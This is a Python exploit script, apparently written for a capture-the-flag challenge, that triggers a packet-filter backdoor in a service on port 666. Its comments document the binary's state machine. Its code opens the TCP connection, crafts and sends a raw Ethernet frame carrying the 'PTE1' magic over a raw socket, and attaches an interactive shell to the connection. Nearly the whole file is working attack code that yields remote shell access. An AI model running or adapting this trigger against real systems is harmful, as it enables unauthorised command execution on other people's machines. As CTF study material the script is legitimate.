#!/usr/bin/env python3
# trigger_baby_passes_filters.py
# CTF exploit trigger for 'baby-passes-filters' backdoor
#
# REQUIRES: root / CAP_NET_RAW (for AF_PACKET raw socket)
# USAGE:    python3 trigger_baby_passes_filters.py [target_interface]
#
# ─────────────────────────────────────────────────────────────────────────────
# EXECUTION ORDER (state machine in the binary):
#
#   Step 1 ─ TCP connect to port 666
#             The service's epoll loop calls accept() and registers your fd
#             in its internal linked-list (DAT_00104cb8). Without this, the
#             fork() loop iterates over an empty list → no shell is spawned.
#
#   Step 2 ─ Flush the AF_PACKET socket state
#             The service starts with a 1-instruction BPF (RET #0 = DROP).
#             It loops: while recv(..., MSG_DONTWAIT) != -1 && errno != EAGAIN
#             Sending any data to TCP:666 (or just having an active connection)
#             causes the socket buffer to drain → errno=EAGAIN=11 (0xb) →
#             loop exits → setsockopt attaches the real 118-instruction BPF.
#
#   Step 3 ─ Send the raw Ethernet trigger frame (this script)
#             The AF_PACKET socket with the 118-instruction BPF filter will
#             only pass packets that satisfy ALL of these checks:
#               [BPF-1]  EtherType  == 0x0800  (IPv4)
#               [BPF-2]  IP.proto   == 0x06    (TCP)
#               [BPF-3]  TCP.dport  == 0x029a  (666)
#               [BPF-4]  TCP payload starts with 0x50 0x54 0x45 0x31 ("PTE1")
#             The binary then forks twice (double-fork → orphan to init),
#             calls dup2() to redirect the registered TCP fd to stdin/stdout/
#             stderr, and execve("/bin/sh", ...).
#
#   Step 4 ─ Wait for drain loop, then send commands
#             The grandchild process runs:
#               do { read(*fd, buf, 0x200); } while (read > 0);
#             This discards everything in the socket buffer until it blocks.
#             Wait ~1–2 s before sending any shell commands.
#
# ─────────────────────────────────────────────────────────────────────────────

import socket
import struct
import time
import sys

# ─── Configuration ───────────────────────────────────────────────────────────
TARGET_IP   = "127.0.0.1"
TARGET_PORT = 666
IFACE       = sys.argv[1] if len(sys.argv) > 1 else "lo"  # interface name
# ─────────────────────────────────────────────────────────────────────────────


def checksum(data: bytes) -> int:
    """Standard Internet checksum (RFC 1071)."""
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def build_trigger_packet(src_ip: str, dst_ip: str, dport: int = 666) -> bytes:
    """
    Build a complete Ethernet frame that passes the 118-instruction BPF filter.

    Packet memory layout (byte offsets from start of Ethernet frame):
    ┌─────────────────────────────────────────────────────────────────┐
    │ ETHERNET HEADER  (14 bytes, offsets 0x00–0x0d)                  │
    │  0x00  [6]  DST MAC       ff:ff:ff:ff:ff:ff  (broadcast)        │
    │  0x06  [6]  SRC MAC       00:00:00:00:00:00                      │
    │  0x0c  [2]  EtherType     0x0800  ← BPF check [1]: must be IPv4 │
    ├─────────────────────────────────────────────────────────────────┤
    │ IPv4 HEADER  (20 bytes, offsets 0x0e–0x21)                      │
    │  0x0e  [1]  Ver+IHL       0x45  (ver=4, IHL=5 → 20-byte header) │
    │  0x0f  [1]  DSCP/ECN      0x00                                   │
    │  0x10  [2]  Total Length  computed                               │
    │  0x12  [2]  IP ID         0x0001                                 │
    │  0x14  [2]  Flags+Frag    0x4000  (DF)                           │
    │  0x16  [1]  TTL           0x40  (64)                             │
    │  0x17  [1]  Protocol      0x06  ← BPF check [2]: must be TCP    │
    │  0x18  [2]  IP Checksum   computed                               │
    │  0x1a  [4]  Src IP        127.0.0.1                              │
    │  0x1e  [4]  Dst IP        127.0.0.1                              │
    ├─────────────────────────────────────────────────────────────────┤
    │ TCP HEADER  (20 bytes, offsets 0x22–0x35)                       │
    │  0x22  [2]  Src Port      0x1234  (arbitrary)                    │
    │  0x24  [2]  Dst Port      0x029a  ← BPF check [3]: must be 666  │
    │  0x26  [4]  Seq Number    0x00000001                             │
    │  0x2a  [4]  Ack Number    0x00000000                             │
    │  0x2e  [1]  Data Offset   0x50  (upper nibble=5 → 20-byte hdr)  │
    │  0x2f  [1]  Flags         0x02  (SYN)                            │
    │  0x30  [2]  Window        0x16d0 (5840)                          │
    │  0x32  [2]  TCP Checksum  computed                               │
    │  0x34  [2]  Urgent        0x0000                                 │
    ├─────────────────────────────────────────────────────────────────┤
    │ TCP PAYLOAD  (offsets 0x36+)                                     │
    │  0x36  [4]  MAGIC         50 54 45 31  ← BPF check [4]: "PTE1"  │
    │  0x3a  [8]  Padding       00 00 ...  (fill to reasonable length) │
    └─────────────────────────────────────────────────────────────────┘
    Total frame size: 14 + 20 + 20 + 12 = 66 bytes
    """
    payload = b"PTE1" + b"\x00" * 8       # 12 bytes: magic + padding

    # ── Ethernet Header ───────────────────────────────────────────────
    eth_dst  = b"\xff\xff\xff\xff\xff\xff"
    eth_src  = b"\x00\x00\x00\x00\x00\x00"
    eth_type = b"\x08\x00"                 # IPv4
    eth_hdr  = eth_dst + eth_src + eth_type

    # ── IPv4 Header (no checksum yet) ─────────────────────────────────
    ip_ihl_ver  = 0x45                     # version 4, IHL 5
    ip_tos      = 0
    ip_tot_len  = 20 + 20 + len(payload)   # ip+tcp+payload
    ip_id       = 1
    ip_frag_off = 0x4000                   # DF flag
    ip_ttl      = 64
    ip_proto    = 6                        # TCP
    ip_check    = 0                        # fill in below
    ip_src      = socket.inet_aton(src_ip)
    ip_dst      = socket.inet_aton(dst_ip)

    ip_hdr_no_csum = struct.pack(
        "!BBHHHBBH4s4s",
        ip_ihl_ver, ip_tos, ip_tot_len,
        ip_id, ip_frag_off,
        ip_ttl, ip_proto, ip_check,
        ip_src, ip_dst
    )
    ip_check = checksum(ip_hdr_no_csum)
    ip_hdr = struct.pack(
        "!BBHHHBBH4s4s",
        ip_ihl_ver, ip_tos, ip_tot_len,
        ip_id, ip_frag_off,
        ip_ttl, ip_proto, ip_check,
        ip_src, ip_dst
    )

    # ── TCP Header (no checksum yet) ──────────────────────────────────
    tcp_sport   = 0x1234
    tcp_dport   = dport                    # 666 = 0x029a
    tcp_seq     = 1
    tcp_ack_seq = 0
    tcp_doff    = (5 << 4)                 # data offset = 5 (20 bytes), upper nibble
    tcp_flags   = 0x02                     # SYN
    tcp_window  = 5840
    tcp_check   = 0
    tcp_urg_ptr = 0

    tcp_hdr_no_csum = struct.pack(
        "!HHLLBBHHH",
        tcp_sport, tcp_dport,
        tcp_seq, tcp_ack_seq,
        tcp_doff, tcp_flags,
        tcp_window, tcp_check, tcp_urg_ptr
    )

    # TCP pseudo-header for checksum
    pseudo = struct.pack("!4s4sBBH",
        ip_src, ip_dst, 0, ip_proto,
        len(tcp_hdr_no_csum) + len(payload)
    )
    tcp_check = checksum(pseudo + tcp_hdr_no_csum + payload)
    tcp_hdr = struct.pack(
        "!HHLLBBHHH",
        tcp_sport, tcp_dport,
        tcp_seq, tcp_ack_seq,
        tcp_doff, tcp_flags,
        tcp_window, tcp_check, tcp_urg_ptr
    )

    return eth_hdr + ip_hdr + tcp_hdr + payload


def get_interface_index(iface: str) -> int:
    """Get the network interface index for AF_PACKET sendto."""
    import ctypes
    import ctypes.util

    SIOCGIFINDEX = 0x8933
    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)

    class ifreq(ctypes.Structure):
        _fields_ = [("ifr_name", ctypes.c_char * 16),
                    ("ifr_ifindex", ctypes.c_int)]

    req = ifreq()
    req.ifr_name = iface.encode()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    libc.ioctl(sock.fileno(), SIOCGIFINDEX, ctypes.byref(req))
    sock.close()
    return req.ifr_ifindex


def main():
    print("[*] baby-passes-filters — BPF backdoor trigger")
    print(f"[*] Target: {TARGET_IP}:{TARGET_PORT}  Interface: {IFACE}")
    print()

    # ── STEP 1: TCP connect to register in linked list ─────────────────
    print("[1] Connecting to TCP port 666 to register fd in linked list...")
    tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_sock.connect((TARGET_IP, TARGET_PORT))
    print(f"    Connected: {tcp_sock.getsockname()} → {tcp_sock.getpeername()}")

    # ── STEP 2: Flush — break the EAGAIN recv loop ─────────────────────
    # The binary spins:  while recv(fd, buf, 0x100, MSG_DONTWAIT) != -1
    # A live connection makes the buffer non-blocking read return EAGAIN,
    # which lets the binary fall out of the loop and attach the real filter.
    print("[2] Sending flush byte to break EAGAIN recv loop...")
    tcp_sock.send(b"\x00")
    time.sleep(0.5)   # give the binary time to re-attach the real BPF filter
    print("    Flush sent. Real 118-instruction BPF now active.")

    # ── STEP 3: Craft and send the raw trigger frame ───────────────────
    print("[3] Building raw Ethernet trigger frame with PTE1 magic...")
    frame = build_trigger_packet(TARGET_IP, TARGET_IP, TARGET_PORT)

    print(f"    Frame ({len(frame)} bytes):")
    for i in range(0, len(frame), 16):
        chunk = frame[i:i+16]
        hex_str  = " ".join(f"{b:02x}" for b in chunk)
        asc_str  = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"    {i:04x}  {hex_str:<48}  {asc_str}")

    print()
    print("    BPF checks summary:")
    import socket as _s
    eth_type = struct.unpack_from("!H", frame, 12)[0]
    ip_proto = frame[23]
    tcp_dport = struct.unpack_from("!H", frame, 36)[0]
    magic = frame[54:58]
    print(f"      EtherType = 0x{eth_type:04x}  (need 0x0800) → {'PASS ✓' if eth_type==0x0800 else 'FAIL ✗'}")
    print(f"      IP.proto  = 0x{ip_proto:02x}    (need 0x06)   → {'PASS ✓' if ip_proto==6 else 'FAIL ✗'}")
    print(f"      TCP.dport = {tcp_dport}     (need 666)    → {'PASS ✓' if tcp_dport==666 else 'FAIL ✗'}")
    print(f"      Payload   = {magic!r}  (need b'PTE1') → {'PASS ✓' if magic==b'PTE1' else 'FAIL ✗'}")
    print()

    # AF_PACKET raw socket — requires root/CAP_NET_RAW
    ETH_P_ALL = 0x0003
    raw_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                             socket.htons(ETH_P_ALL))

    ifindex = get_interface_index(IFACE)
    # sockaddr_ll: (proto, ifindex, hatype, pkttype, halen, addr)
    addr_ll = (IFACE, ETH_P_ALL)
    raw_sock.bind(addr_ll)

    raw_sock.send(frame)
    raw_sock.close()
    print(f"[3] Trigger frame sent on interface '{IFACE}'.")

    # ── STEP 4: Wait for drain loop, then interact ─────────────────────
    print("[4] Waiting 2 s for grandchild drain loop to finish...")
    time.sleep(2.0)

    print()
    print("[+] Shell should now be attached to the TCP socket.")
    print("    Dropping into interactive mode (Ctrl+C to exit).\n")

    # Switch to interactive shell I/O over the TCP socket
    import select
    tcp_sock.setblocking(False)
    import os
    import sys
    import termios
    import tty

    old_term = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        while True:
            rlist, _, _ = select.select([tcp_sock, sys.stdin], [], [], 0.1)
            for r in rlist:
                if r is tcp_sock:
                    data = tcp_sock.recv(4096)
                    if not data:
                        print("\r\n[*] Connection closed.")
                        return
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                elif r is sys.stdin:
                    data = sys.stdin.buffer.read(1)
                    tcp_sock.send(data)
    except KeyboardInterrupt:
        pass
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_term)
        tcp_sock.close()
        print("\r\n[*] Done.")


if __name__ == "__main__":
    main()
